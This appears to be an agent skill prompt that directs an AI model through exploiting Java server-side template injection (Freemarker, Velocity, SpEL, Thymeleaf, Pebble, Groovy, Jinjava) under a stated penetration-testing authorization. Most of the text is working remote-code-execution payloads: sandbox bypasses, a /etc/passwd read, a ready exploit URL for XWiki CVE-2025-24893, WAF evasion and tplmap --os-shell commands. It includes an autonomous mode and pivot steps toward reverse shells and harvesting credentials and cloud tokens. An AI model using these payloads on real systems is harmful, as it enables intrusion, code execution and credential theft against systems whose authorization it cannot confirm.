---
name: ssti-freemarker
description: >
  Guide Freemarker/Java server-side template injection exploitation during
  authorized penetration testing.
keywords:
  - Freemarker SSTI
  - Java template injection
  - Velocity SSTI
  - Thymeleaf SSTI
  - Pebble SSTI
  - Spring EL injection
  - SpEL injection
  - Java EL injection
  - Expression Language injection
  - Groovy SSTI
  - ${7*7} returns 49 in Java
  - Jinjava SSTI
  - HubL injection
tools:
  - burpsuite
  - sstimap
  - tplmap
opsec: medium
---

# Freemarker / Java SSTI

You are helping a penetration tester exploit server-side template injection in a
Java application. The target uses Freemarker, Velocity, Thymeleaf, Pebble, Spring
Expression Language (SpEL), Groovy, or Java EL and processes attacker-controlled
input through the template/expression engine without proper sanitization. The goal
is to escalate from expression evaluation to remote code execution or file access.
All testing is under explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present the command with a one-line explanation of what it does and
  why. Wait for explicit user approval before executing. Never batch multiple
  target-touching commands without approval — present them one at a time (or as
  a small logical group if they achieve a single objective, e.g., "enumerate SMB
  shares"). Local-only operations (file writes, output parsing, engagement
  logging, hash cracking) do not require approval. At decision forks, present
  options and let the user choose.
- **Autonomous**: Execute end-to-end. Identify the engine, confirm code execution,
  demonstrate RCE. Report at milestones.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically with `activity.md`, `findings.md`, and
  `evidence/`.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones (test confirmed,
  RCE achieved, data extracted, pivot to another skill):
  `### [YYYY-MM-DD HH:MM:SS] ssti-freemarker → <target>` with bullet points of actions/results.
- **Findings** → append to `engagement/findings.md` when a vulnerability is confirmed:
  `## N. Title [Severity]` with target, technique, impact, evidence path, repro command.
- **Evidence** → save significant output to `engagement/evidence/` with descriptive
  filenames (e.g., `ssti-freemarker-rce-output.txt`).

If no engagement directory exists and the user declines to create one, proceed normally.

### Invocation Log

Immediately on activation — before reading state.md or doing any assessment —
log invocation to both the screen and activity.md:

1. **On-screen**: Print `[ssti-freemarker] Activated → <target>` so the operator
   sees which skill is running.
2. **activity.md**: Append:
   ```
   ### [YYYY-MM-DD HH:MM:SS] ssti-freemarker → <target>
   - Invoked (assessment starting)
   ```

**Timestamps:** Replace `[YYYY-MM-DD HH:MM:SS]` with the actual current date
and time. Run `date '+%Y-%m-%d %H:%M:%S'` to get it. Never write the literal
placeholder `[YYYY-MM-DD HH:MM:SS]` — activity.md entries need real timestamps
with date and second precision for timeline reconstruction.

This entry must be written NOW, not deferred. Subsequent milestone entries
append bullet points under this same header.


## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Write `engagement/state.md` at these checkpoints (not just at completion):
1. **After confirming a vulnerability** — add to Vulns with `[found]`
2. **After successful exploitation** — add credentials, access, pivot paths
3. **Before routing to another skill** — the next skill reads state.md on activation

At each checkpoint and on completion, update the relevant sections of
`engagement/state.md`:
- **Targets**: Add any new hosts, URLs, or services discovered
- **Credentials**: Add any credentials, tokens, or keys recovered
- **Access**: Add or update footholds (shells, sessions, DB access)
- **Vulns**: Add confirmed vulns as one-liners; mark exploited ones `[done]`
- **Pivot Map**: Add new attack paths discovered (X leads to Y)
- **Blocked**: Record what was tried and why it failed

Keep entries compact — one line per item. State.md is a snapshot, not a log.

## Prerequisites

- Confirmed template expression evaluation: `${7*7}` returns `49`, or
  `{{7*7}}` returns `49` in a Java context
- Multiple expression syntaxes exist in Java: `${ }`, `#{ }`, `*{ }`, `@{ }`,
  `~{ }`, `[= ]`, `[[ ]]` — test all if one fails
- If `{{7*'7'}}` returns `7777777` or `49`, the engine is likely Python (Jinja2)
  or PHP (Twig), not Java

## Step 1: Assess

If not already provided, determine:
1. **Framework** — Spring Boot, Struts, JSF, XWiki, HubSpot, or custom
2. **Template engine** — Freemarker, Velocity, Thymeleaf, Pebble, SpEL, Groovy, Java EL
3. **Injection point** — URL param, form field, error page, PDF/email template
4. **Expression syntax** — which delimiters work? (`${}`, `#{}`, `*{}`, `[=]`)

Skip if context was already provided.

## Step 2: Engine Identification

### Detection by Error Messages

Inject `(1/0).zxy.zxy` inside template tags. The error reveals the language:

| Error | Engine |
|---|---|
| `java.lang.ArithmeticException` | Java EL / SpEL |
| `Arithmetic operation failed` | Freemarker |
| No error, but `0` returned | Velocity (silently handles division) |

### Detection by Syntax

| Payload | Result | Engine |
|---|---|---|
| `${7*7}` → `49` | Freemarker, SpEL, Java EL, Groovy |
| `#{7*7}` → `49` | Freemarker (legacy), Thymeleaf, Java EL |
| `[=7*7]` → `49` | Freemarker (alternative syntax, >= 2.3.4) |
| `*{7*7}` → `49` | Spring/Thymeleaf |
| `[[${7*7}]]` → `49` | Thymeleaf (expression inlining) |
| `${7*'7'}` → nothing/error | Freemarker (doesn't do string repetition) |
| `${foobar}` → empty | Freemarker (undefined vars return empty) |
| `{{ someString.toUpperCase() }}` → works | Pebble |
| `{{'a'.toUpperCase()}}` → `A` | Jinjava / HubL |

### Freemarker Quick Confirmation

```java
${"freemarker.template.utility.Execute"?new()("id")}
```

If this returns command output, the engine is Freemarker with no sandbox.

## Step 3: RCE — Freemarker

### Execute Class (most reliable)

```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
```

Alternative syntax variants:

```java
#{"freemarker.template.utility.Execute"?new()("id")}
[="freemarker.template.utility.Execute"?new()("id")]
```

### File Reading

```java
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

Convert the returned byte values to ASCII.

### Blind / Error-Based

```java
# Error-Based
${("xx"+("freemarker.template.utility.Execute"?new()("id")))?new()}

# Boolean-Based
${1/(("freemarker.template.utility.Execute"?new()("id && echo UniqueString"))?chop_linebreak?ends_with("UniqueString"))?string('1','0')?eval}

# Time-Based
${"freemarker.template.utility.Execute"?new()("id && sleep 5")}
```

### Sandbox Bypass (Freemarker < 2.3.30)

```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

## Step 4: RCE — Velocity

### Classic Payload

```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

### Alternative (via string class reflection)

```java
#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("id"))
#set($out=$process.getInputStream())
#set($null=$process.waitFor())
#foreach($i in [1..$out.available()])
$out.read()
#end
```

### Error-Based (Velocity)

```java
#set($s="")
#set($sc=$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()))
#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
#set($n=$p.waitFor())
#set($b="Y:/A:/"+$sc.newInstance($p.inputStream.readAllBytes(), "UTF-8"))
#include($b)
```

## Step 5: RCE — Spring Expression Language (SpEL)

### Basic RCE via Runtime

```java
${T(java.lang.Runtime).getRuntime().exec("id")}
```

### With Output Capture

```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}
```

### Via Method Invoke

```java
${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('id')}
```

### Character-by-Character Bypass (avoid blacklisted strings)

```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

### Environment Variables

```java
${T(java.lang.System).getenv()}
```

### Session Manipulation

```java
${pageContext.request.getSession().setAttribute("admin",true)}
```

### Multiple Syntax Variants

If `${...}` is blocked, try: `#{...}`, `*{...}`, `@{...}`, `~{...}`

## Step 6: RCE — Other Java Engines

### Thymeleaf

```java
# Expression inlining
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]

# Preprocessing (double underscore)
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x

# Spring View Manipulation
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```

### Pebble

Old version (< 3.0.9):
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
```

New version:
```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

### Groovy

```groovy
${"id".execute().text}

# Sandbox bypass
${@ASTTest(value={assert java.lang.Runtime.getRuntime().exec("id")}) def x}
```

### Java EL (JSF/JSP)

```java
${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}

# With output capture
${''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes())}
```

### Jinjava (HubSpot)

```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"whoami\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())")}}
```

## Step 7: Real-World Targets

### XWiki SolrSearch (CVE-2025-24893)

XWiki <= 15.10.10 allows unauthenticated Groovy SSTI via SolrSearch RSS:

```
/xwiki/bin/view/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln(%22id%22.execute().text)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
```

URL-encode all characters (use `%20` not `+`). Output appears in RSS `<title>`.

### Spring Boot Error Pages

If Thymeleaf processes error page templates with user input:
```
http://TARGET/(${T(java.lang.Runtime).getRuntime().exec('id')})
```

## Step 8: Escalate or Pivot

**Before routing**: Write `engagement/state.md` and append to
`engagement/activity.md` with results so far. The next skill reads state.md
on activation — stale state means duplicate work or missed context.

- **Got RCE**: Establish reverse shell, enumerate internal network, route to privesc
- **Got environment variables**: Extract database credentials, API keys, cloud tokens
- **Got file read**: Extract application config, keystores, deployment descriptors
- **Found SpEL in Spring**: Check for additional injection points (error pages, form validation messages)
- **XWiki/Wiki context**: Extract `hibernate.cfg.xml` for DB credentials, pivot via SSH
- **Found SQLi in the same app**: Route to **sql-injection-error** or **sql-injection-union**

Update `engagement/state.md` with any new credentials, access, vulns, or pivot paths discovered.

When routing, pass along: confirmed engine, injection point, working payload,
syntax variant used, current mode.

## OPSEC Notes

- Java template payloads execute on the JVM — visible in application logs
- `Runtime.exec()` creates OS process artifacts (visible in process lists)
- Large payloads (SpEL character-by-character) may trigger WAF rules
- Freemarker `Execute` class usage may be logged by security managers
- Velocity `#set` directives with reflection are distinctive in logs
- Cleanup: no persistent artifacts unless you wrote files

## Troubleshooting

### `Execute` Class Not Found (Freemarker)

- Freemarker >= 2.3.30 may restrict class instantiation
- Try the sandbox bypass payload (requires version < 2.3.30)
- Check if `ObjectWrapper` is set to `BeansWrapper` (allows reflection)
- Try `product.getClass()` chain for file reading instead

### SpEL `T()` Operator Blocked

- Try method invoke chain: `''.getClass().forName(...).getMethods()[6].invoke(...)`
- Use `javax.script.ScriptEngineManager` for JavaScript-based execution
- Try `ProcessBuilder` instead of `Runtime`:
  ```java
  ${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
  ${request.getAttribute("c").add("id")}
  ${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
  ```

### Runtime.exec() Returns Empty

- `Runtime.exec()` returns a `Process` object, not output
- Need `IOUtils.toString()` (requires commons-io on classpath)
- Or read the input stream manually:
  ```java
  ${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}
  ```

### WAF Blocking Payloads

- Use alternative Freemarker syntax: `[=...]` instead of `${...}`
- Freemarker obfuscation via `lower_abc`:
  ```java
  ${(9?lower_abc+4?lower_abc)}  # produces "id"
  ```
- SpEL: use Character.toString() chains to build command strings
- Try base64-encoded command with Velocity

### Automated Tools

```bash
# SSTImap
python3 sstimap.py -u 'https://TARGET/page?name=test' -s

# tplmap
python2.7 tplmap.py -u 'https://TARGET/page?name=test*' --os-shell

# TInjA — good for polyglot-based engine detection
tinja url -u "https://TARGET/page?name=test"
```
